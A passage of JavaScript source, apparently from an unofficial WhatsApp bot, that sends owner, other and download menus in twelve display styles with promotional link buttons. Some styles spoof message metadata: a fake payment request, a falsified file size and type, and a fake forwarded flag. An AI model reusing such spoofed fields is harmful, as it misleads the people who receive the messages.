                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU ⚙️",
"title":"<!> <!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'ownermenu': {
            ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'othermenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'downloadmenu': {
ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
